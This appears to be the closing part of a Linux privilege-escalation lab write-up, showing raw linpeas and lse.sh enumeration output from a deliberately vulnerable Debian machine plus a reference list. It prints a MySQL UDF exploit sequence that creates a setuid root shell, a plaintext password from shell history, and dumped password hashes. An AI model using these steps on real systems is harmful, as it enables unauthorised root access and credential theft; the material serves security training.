-rw-r--r-- 1 root root 335 Jul 18  2010 /etc/sgml/catalog.old
-rw-r--r-- 1 root root 102420 Feb 14 07:42 /tmp/backup.tar.gz

[+] Looking for tables inside readable .db/.sqlite files (limit 100)
                                                                                                                                                                                                             
[+] Web files?(output limit)
/var/www/:                                                                                                                                                                                                   
total 16K
drwxr-xr-x  3 root root 4.0K May 14  2017 .
drwxr-xr-x 14 root root 4.0K May 13  2017 ..
drwxr-xr-x  2 root root 4.0K May 14  2017 html
-rw-r--r--  1 root root  177 May 13  2017 index.html

/var/www/html:
total 12K
drwxr-xr-x 2 root root 4.0K May 14  2017 .

[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                                                                          
-rw-r--r-- 1 root root 0 May 13  2017 /etc/apache2/httpd.conf                                                                                                                                                
Reading /etc/apache2/httpd.conf
                                                                                                                                                                                                             
-rw-r--r-- 1 root root 1657 Apr 10  2010 /etc/bash.bashrc
-rw-r--r-- 1 root root 3184 Apr 10  2010 /etc/skel/.bashrc
-rw-r--r-- 1 root root 675 Apr 10  2010 /etc/skel/.profile
lrwxrwxrwx 1 root root 33 May 14  2017 /etc/systemd/system/multi-user.target.wants/nginx.service -> /lib/systemd/system/nginx.service
-rw------- 1 user user 293 Feb 14 06:59 /home/user/.bash_history
Looking for possible passwords inside /home/user/.bash_history
mysql -h somehost.local -uroot -ppassword123                                                                                                                                                                 
rm /tmp/rootbash
rm /tmp/rootbash
rm /tmp/rootbash

-rw-r--r-- 1 user user 3235 May 14  2017 /home/user/.bashrc
-rw------- 1 user user 332 Feb 14 03:51 /home/user/.mysql_history
Looking for possible passwords inside /home/user/.mysql_history
use mysql;                                                                                                                                                                                                   
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

-rw------- 1 user user 11 May 15  2020 /home/user/.nano_history
Looking for possible passwords inside /home/user/.nano_history
                                                                                                                                                                                                             
-rw-r--r-- 1 user user 725 May 13  2017 /home/user/.profile
-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 870 Nov 21  2010 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 1865 Nov 21  2010 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw------- 1 root root 0 Feb 14 03:25 /var/lib/nfs/.xtab.lock                                                                                                                                                
-rw------- 1 root root 0 May 15  2020 /var/lib/nfs/.etab.lock
-rw------- 1 root root 0 Feb 14 06:54 /var/lib/nfs/.rmtab.lock
-rw-r--r-- 1 root root 220 Apr 10  2010 /etc/skel/.bash_logout
-rw------- 1 root root 0 May 12  2017 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 Feb 14 03:23 /lib/init/rw/.ramfs
-rw------- 1 user user 137 May 15  2017 /home/user/.lesshst
-rw------- 1 user user 6695 Feb 14 05:35 /home/user/.viminfo
-rw-r--r-- 1 user user 220 May 12  2017 /home/user/.bash_logout
-rw-r--r-- 1 root root 0 Feb 14 03:23 /dev/.initramfs-tools
-rw------- 1 root root 0 Feb 14 03:25 /proc/fs/nfsd/.getfs
-rw------- 1 root root 0 Feb 14 03:25 /proc/fs/nfsd/.getfd
--w------- 1 root root 0 Feb 14 03:25 /proc/fs/nfsd/.unexport
--w------- 1 root root 0 Feb 14 03:25 /proc/fs/nfsd/.export
--w------- 1 root root 0 Feb 14 03:25 /proc/fs/nfsd/.del
--w------- 1 root root 0 Feb 14 03:25 /proc/fs/nfsd/.add
--w------- 1 root root 0 Feb 14 03:25 /proc/fs/nfsd/.svc

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
-rw-r--r-- 1 root root 102420 Feb 14 07:42 /tmp/backup.tar.gz                                                                                                                                                
-rw-r--r-- 1 root root 29 Feb 14 05:26 /tmp/useless
-rwxr-xr-x 1 user user 6324 Feb 14 05:10 /tmp/libcrypt.so.1
-rw-r--r-- 1 user user 4807 Feb 14 07:26 /tmp/c0w2.c
-rw-r--r-- 1 user user 60 Feb 14 06:01 /tmp/root.pm
-rwxr-xr-x 1 user user 3857 Feb 14 05:02 /tmp/preload.so
-rw-r--r-- 1 root root 243 May 12  2017 /var/backups/apt.extended_states.3.gz
-rw-r--r-- 1 root root 254113 May 15  2020 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 154661 May 12  2017 /var/backups/aptitude.pkgstates.0
-rw-r--r-- 1 root root 627 May 15  2017 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 48531 May 12  2017 /var/backups/dpkg.status.3.gz
-rw-r--r-- 1 root root 74780 May 15  2017 /var/backups/dpkg.status.1.gz
-rw-r--r-- 1 root root 5266 May 15  2020 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 558 May 13  2017 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 68660 May 13  2017 /var/backups/dpkg.status.2.gz

[+] Interesting writable files owned by me or writable by everyone (not in Home)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                                                               
/dev/shm                                                                                                                                                                                                     
/etc/exports
/etc/init.d/rc.local
/etc/passwd
/etc/shadow
/home/user
/tmp
/tmp/c0w2.c
/tmp/libcrypt.so.1
/tmp/preload.so
/tmp/root.pm
/usr/lib/mysql/plugin/raptor_udf2.so
/usr/local/bin/overwrite.sh
/var/lock
/var/tmp

[+] Interesting GROUP writable files (not in Home)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                                                               
  Group user:                                                                                                                                                                                                
  Group cdrom:                                                                                                                                                                                               
  Group floppy:                                                                                                                                                                                              
  Group audio:                                                                                                                                                                                               
  Group dip:                                                                                                                                                                                                 
  Group video:                                                                                                                                                                                               
  Group plugdev:                                                                                                                                                                                             
                                                                                                                                                                                                             
[+] Searching passwords in config PHP files
                                                                                                                                                                                                             
[+] Finding IPs inside logs (limit 70)
     77 /var/log/dpkg.log.1:1.7.3.1                                                                                                                                                                          
     37 /var/log/dpkg.log.1:1.5.36.1
     29 /var/log/dpkg.log.1:4.1.4.2
     19 /var/log/dpkg.log.1:1.2.3.4
      9 /var/log/dpkg.log.1:2.2.4.2
      3 /var/log/wtmp.1:192.168.1.125
      2 /var/log/installer/status:1.2.3.3
      1 /var/log/installer/status:1.2.3.4

[+] Finding passwords inside logs (limit 70)
/var/log/dpkg.log.1:2017-05-12 07:02:29 configure base-passwd 3.5.22 3.5.22                                                                                                                                  
/var/log/dpkg.log.1:2017-05-12 07:02:29 install base-passwd <none> 3.5.22
/var/log/dpkg.log.1:2017-05-12 07:02:29 status half-configured base-passwd 3.5.22
/var/log/dpkg.log.1:2017-05-12 07:02:29 status half-installed base-passwd 3.5.22
/var/log/dpkg.log.1:2017-05-12 07:02:29 status installed base-passwd 3.5.22
/var/log/dpkg.log.1:2017-05-12 07:02:29 status unpacked base-passwd 3.5.22
/var/log/dpkg.log.1:2017-05-12 07:02:32 install passwd <none> 1:4.1.4.2+svn3283-2+squeeze1
/var/log/dpkg.log.1:2017-05-12 07:02:32 status half-configured base-passwd 3.5.22
/var/log/dpkg.log.1:2017-05-12 07:02:32 status half-installed base-passwd 3.5.22
/var/log/dpkg.log.1:2017-05-12 07:02:32 status half-installed passwd 1:4.1.4.2+svn3283-2+squeeze1
/var/log/dpkg.log.1:2017-05-12 07:02:32 status unpacked base-passwd 3.5.22
/var/log/dpkg.log.1:2017-05-12 07:02:32 status unpacked passwd 1:4.1.4.2+svn3283-2+squeeze1
/var/log/dpkg.log.1:2017-05-12 07:02:32 upgrade base-passwd 3.5.22 3.5.22
/var/log/dpkg.log.1:2017-05-12 07:02:34 configure base-passwd 3.5.22 3.5.22
/var/log/dpkg.log.1:2017-05-12 07:02:34 status half-configured base-passwd 3.5.22
/var/log/dpkg.log.1:2017-05-12 07:02:34 status installed base-passwd 3.5.22
/var/log/dpkg.log.1:2017-05-12 07:02:34 status unpacked base-passwd 3.5.22
/var/log/dpkg.log.1:2017-05-12 07:02:35 configure passwd 1:4.1.4.2+svn3283-2+squeeze1 1:4.1.4.2+svn3283-2+squeeze1
/var/log/dpkg.log.1:2017-05-12 07:02:35 status half-configured passwd 1:4.1.4.2+svn3283-2+squeeze1
/var/log/dpkg.log.1:2017-05-12 07:02:35 status installed passwd 1:4.1.4.2+svn3283-2+squeeze1
/var/log/dpkg.log.1:2017-05-12 07:02:35 status unpacked passwd 1:4.1.4.2+svn3283-2+squeeze1
/var/log/installer/status:Description: Set up users and passwords

[+] Finding emails inside logs (limit 70)
     62 /var/log/installer/status:debian-boot@lists.debian.org                                                                                                                                               
      2 /var/log/installer/status:pkg-lvm-maintainers@lists.alioth.debian.org
      1 /var/log/installer/status:xfs@oss.sgi.com
      1 /var/log/installer/status:tytso@mit.edu
      1 /var/log/installer/status:racke@linuxia.de
      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org
      1 /var/log/installer/status:parted-maintainers@lists.alioth.debian.org
      1 /var/log/installer/status:packages@release.debian.org
      1 /var/log/installer/status:lamont@debian.org
      1 /var/log/installer/status:guus@debian.org
      1 /var/log/installer/status:ender@debian.org
      1 /var/log/installer/status:djpig@debian.org
      1 /var/log/installer/status:debian-glibc@lists.debian.org
      1 /var/log/installer/status:debian-bsd@lists.debian.org
      1 /var/log/installer/status:daniel@lists.debian-maintainers.org
      1 /var/log/installer/status:anibal@debian.org

[+] Finding *password* or *credential* files in home (limit 70)
                                                                                                                                                                                                             
[+] Finding 'pwd' or 'passw' variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/etc/exim4/conf.d/auth/30_exim4-config_examples:                     ^${sg{PASSWDLINE}{\\N([^:]+:)(.*)\\N}{\\$2}}\                                                                                           
/etc/exim4/conf.d/auth/30_exim4-config_examples:                    ^${sg{PASSWDLINE}{\\N([^:]+:)(.*)\\N}{\\$2}}"
/etc/exim4/conf.d/auth/30_exim4-config_examples:                 ; ${sg{PASSWDLINE}{\\N([^:]+:)(.*)\\N}{\\$2}}"
/etc/exim4/conf.d/auth/30_exim4-config_examples:PASSWDLINE=${sg{\
/etc/exim4/exim4.conf.template:              ^${sg{PASSWDLINE}{\\N([^:]+:)(.*)\\N}{\\$2}}\
/etc/exim4/exim4.conf.template:             ^${sg{PASSWDLINE}{\\N([^:]+:)(.*)\\N}{\\$2}}"
/etc/exim4/exim4.conf.template:          ; ${sg{PASSWDLINE}{\\N([^:]+:)(.*)\\N}{\\$2}}"
/etc/exim4/exim4.conf.template:PASSWDLINE=${sg{\
/etc/nsswitch.conf:passwd:         compat
/etc/pam.d/common-password:password     [success=1 default=ignore]      pam_unix.so obscure sha512
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:challengePassword          = A challenge password
/etc/ssl/openssl.cnf:challengePassword_max              = 20
/etc/ssl/openssl.cnf:challengePassword_min              = 4
/home/user/tools/mysql-udf/raptor_udf2.c: * Enter password:
/home/user/tools/privesc-scripts/LinEnum.sh:    echo -e "\e[00;33m[-] htpasswd found - could contain passwords:\e[00m\n$htpasswd"
/home/user/tools/privesc-scripts/LinEnum.sh:  echo -e "\e[00;31m[-] Contents of /etc/passwd:\e[00m\n$readpasswd" 
/home/user/tools/privesc-scripts/LinEnum.sh:  echo -e "\e[00;31m[-] Password and storage information:\e[00m\n$logindefs" 
/home/user/tools/privesc-scripts/LinEnum.sh:hashesinpasswd=`grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null`
/home/user/tools/privesc-scripts/LinEnum.sh:htpasswd=`find / -name .htpasswd -print -exec cat {} \; 2>/dev/null`
/home/user/tools/privesc-scripts/LinEnum.sh:readmasterpasswd=`cat /etc/master.passwd 2>/dev/null`
/home/user/tools/privesc-scripts/LinEnum.sh:readpasswd=`cat /etc/passwd 2>/dev/null`
/home/user/tools/privesc-scripts/linpeas.sh:      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
/home/user/tools/privesc-scripts/linpeas.sh:    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
/home/user/tools/privesc-scripts/linpeas.sh:  FIND_PASSWORD_RELEVANT_NAMES=$(prep_to_find "$PASSWORD_RELEVANT_NAMES")
/home/user/tools/privesc-scripts/linpeas.sh:  PASSWORDTRY=$2
/home/user/tools/privesc-scripts/linpeas.sh:  PASSWORD_RELEVANT_NAMES="*password* *credential* creds*"
/home/user/tools/privesc-scripts/lse.sh:    'for u in $(cut -d: -f 1 /etc/passwd); do [ "$u" != "$lse_user" ] && crontab -l -u "$u"; done'
/home/user/tools/privesc-scripts/lse.sh:    'for u in $(cut -d: -f1 /etc/passwd); do [ $(id -u $u) = 0 ] && echo $u; done | grep -v root'
/home/user/tools/privesc-scripts/lse.sh:    'grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab'
/home/user/tools/privesc-scripts/lse.sh:  cecho "${lblue}    Password:${reset} "
/home/user/tools/privesc-scripts/lse.sh:[ -z "$lse_home" ] && lse_home="`(grep -E "^$lse_user:" /etc/passwd | cut -d: -f6)2>/dev/null`"
/var/backups/dpkg.status.0:Depends: libc6 (>= 2.3), libpopt0 (>= 1.15), libselinux1 (>= 1.32), cron | anacron | fcron, base-passwd (>= 2.0.3.4)
/var/backups/dpkg.status.0:Depends: passwd, libc6 (>= 2.3)
/var/backups/dpkg.status.0:Depends: perl-base (>= 5.6.0), passwd (>= 1:4.0.12), debconf | debconf-2.0

[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/etc/exim4/conf.d/auth/30_exim4-config_examples:  client_secret = ${extract{2}{:}{${lookup{$host}nwildlsearch{CONFDIR/passwd.client}{$value}fail}}}                                                          
/etc/exim4/exim4.conf.template:  client_secret = ${extract{2}{:}{${lookup{$host}nwildlsearch{CONFDIR/passwd.client}{$value}fail}}}

[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/home/user/tools/privesc-scripts/lse.sh:    'grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab'                                                                          

[+] Looking for specific hashes inside files - less false positives (limit 70)
                                                                                                                                                                                                             
user@debian:/home/user/tools/privesc-scripts$ 
```

**lse.sh** execution:

```bash
user@debian:/home/user/tools/privesc-scripts$ ./lse.sh
---
If you know the current user password, write it here to check sudo privileges: password321                                                                                                                   
---
                                                                                                                                                                                                             
 LSE Version: 2.1                                                                                                                                                                                            

        User: user
     User ID: 1000
    Password: ******
        Home: /home/user
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
       umask: 0022

    Hostname: debian
       Linux: 2.6.32-5-amd64
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in an administrative groups?.............. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                                                             
[i] usr060 Other users..................................................... skip                                                                                                                             
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                                                             
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... yes!
---
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
---
[!] sud020 Can we sudo with a password?.................................... nope
[*] sud040 Can we read /etc/sudoers?....................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/sbin/exim-4.84-3
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                                                             
[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                                                             
[*] fst070 Can we read /root?.............................................. nope                                                                                                                             
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'user' have mail?.......................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. yes!
---
-rw-r--rw- 1 root root 1059 Feb 14 04:43 /etc/passwd
-rw-r--rw- 1 root shadow 840 Feb 14 04:31 /etc/shadow
---
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... yes!
---
drwxr-xr-x 7 user user 4096 Feb 14 07:42 /home/user
---
[!] fst190 Can we read any backup?......................................... yes!
---
-rw-r--r-- 1 root root 102420 Feb 14 07:45 /tmp/backup.tar.gz
---
[i] fst500 Files owned by user 'user'...................................... skip
[i] fst510 SSH files anywhere.............................................. skip                                                                                                                             
[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                                                             
[i] fst530 List NFS server shares.......................................... skip                                                                                                                             
[i] fst540 Dump fstab file................................................. skip                                                                                                                             
=================================================================( system )=====                                                                                                                             
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                                                                                                                             
[!] sys020 Does the /etc/passwd have hashes?............................... yes!                                                                                                                             
---
newroot:wA9PdBLNI5zuY:0:0:newroot:/root:/bin/bash
---
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read /etc/shadow file?................................... yes!
---
root:$6$7f9n5vRK/uU$eCSSW8NqxeXcYgsCVLAGg5T6GN7fXOV5vOArX3jg0xZR1GXIEdjohL3/vQZjvF0Bz3y..XsEvdguLddxfK/bq.:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
---
[!] sys030 Can we read /etc/shadow- file?.................................. nope
[!] sys030 Can we read /etc/shadow~ file?.................................. nope
[!] sys030 Can we read /etc/gshadow file?.................................. nope
[!] sys030 Can we read /etc/gshadow- file?................................. nope
[!] sys030 Can we read /etc/master.passwd file?............................ nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                                                                                                                             
[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                                                             
===============================================================( security )=====                                                                                                                             
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... nope
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
========================================================( recurrent tasks )=====                                                                                                                             
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
[!] ret060 Can we write to executable paths present in cron jobs........... yes!
---
/etc/crontab:PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
---
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope                                                                                                                             
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                                                                                                                             
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                                                                                                                             
[i] net520 ARP table....................................................... skip                                                                                                                             
[i] net530 Namerservers.................................................... skip                                                                                                                             
[i] net540 Systemd Nameservers............................................. skip                                                                                                                             
[i] net550 Listening TCP................................................... skip                                                                                                                             
[i] net560 Listening UDP................................................... skip                                                                                                                             
===============================================================( services )=====                                                                                                                             
[!] srv000 Can we write in service files?.................................. yes!
---
/etc/init.d/rc.local
---
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                                                             
[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                                                             
[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                                                             
[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                                                             
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                                                             
[i] srv460 List /etc/init/ permissions..................................... skip                                                                                                                             
[!] srv500 Can we write in systemd service files?.......................... nope                                                                                                                             
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                                                                                                                             
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... yes!
---
mysqladmin  Ver 8.42 Distrib 5.1.73, for debian-linux-gnu on x86_64
Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Server version          5.1.73-1+deb6u1
Protocol version        10
Connection              Localhost via UNIX socket
UNIX socket             /var/run/mysqld/mysqld.sock
Uptime:                 4 hours 20 min 28 sec

Threads: 1  Questions: 141  Slow queries: 0  Opens: 101  Flush tables: 1  Open tables: 24  Queries per second avg: 0.9
---
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                                                                                                                             
[i] sof520 Postgres version................................................ skip                                                                                                                             
[i] sof530 Apache version.................................................. skip                                                                                                                             
=============================================================( containers )=====                                                                                                                             
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                                                                                                                             
                                                                                                                                                                                                             
==================================( FINISHED )==================================                                                                                                                             
user@debian:/home/user/tools/privesc-scripts$ 
```

---------------------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [cat - Linux manual page](https://man7.org/linux/man-pages/man1/cat.1.html)
- [chmod - Linux manual page](https://man7.org/linux/man-pages/man1/chmod.1.html)
- [cp - Linux manual page](https://man7.org/linux/man-pages/man1/cp.1.html)
- [cron - Wikipedia](https://en.wikipedia.org/wiki/Cron)
- [crontab(5) - Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [crypt - Linux manual page](https://man7.org/linux/man-pages/man3/crypt.3.html)
- [Dirty COW - Wikipedia](https://en.wikipedia.org/wiki/Dirty_COW)
- [env - Linux manual page](https://man7.org/linux/man-pages/man1/env.1.html)
- [Environment variable - Wikipedia](https://en.wikipedia.org/wiki/Environment_variable)
- [exports(5) - Linux manual page](https://man7.org/linux/man-pages/man5/exports.5.html)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [gcc - Linux manual page](https://man7.org/linux/man-pages/man1/gcc.1.html)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [GTFOBins - Homepage](https://gtfobins.github.io/)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [John the Ripper - Homepage](https://www.openwall.com/john/)
- [john - Kali Tools](https://www.kali.org/tools/john/)
- [LinEnum - GitHub](https://github.com/rebootuser/LinEnum)
- [LinPEAS - GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [linux-smart-enumeration - GitHub](https://github.com/diego-treitos/linux-smart-enumeration)
- [locate - Linux manual page](https://www.man7.org/linux/man-pages/man1/locate.1.html)
- [ld.so - Linux manual page](https://www.man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldd - Linux manual page](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [mkpasswd - Linux manual page](https://linux.die.net/man/1/mkpasswd)
- [mount - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
- [Msfvenom - Metasploit Docs](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [Msfvenom - Kali Tools](https://www.kali.org/tools/metasploit-framework/#msfvenom)
- [mysql - Linux manual page](https://linux.die.net/man/1/mysql)
- [MySQL - Wikipedia](https://en.wikipedia.org/wiki/MySQL)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [Network File System - Wikipedia](https://en.wikipedia.org/wiki/Network_File_System)
- [openssl - Linux manual page](https://linux.die.net/man/1/openssl)
- [OpenSSL - Wikipedia](https://en.wikipedia.org/wiki/OpenSSL)
- [passwd - Wikipedia](https://en.wikipedia.org/wiki/Passwd)
- [passwd(5) - Linux manual page](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [shadow - Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [Shadow file - Wikipedia](https://en.wikipedia.org/wiki/Passwd#Shadow_file)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [strace - Linux manual page](https://man7.org/linux/man-pages/man1/strace.1.html)
- [strings - Linux manual page](https://man7.org/linux/man-pages/man1/strings.1.html)
- [su - Linux manual page](https://man7.org/linux/man-pages/man1/su.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
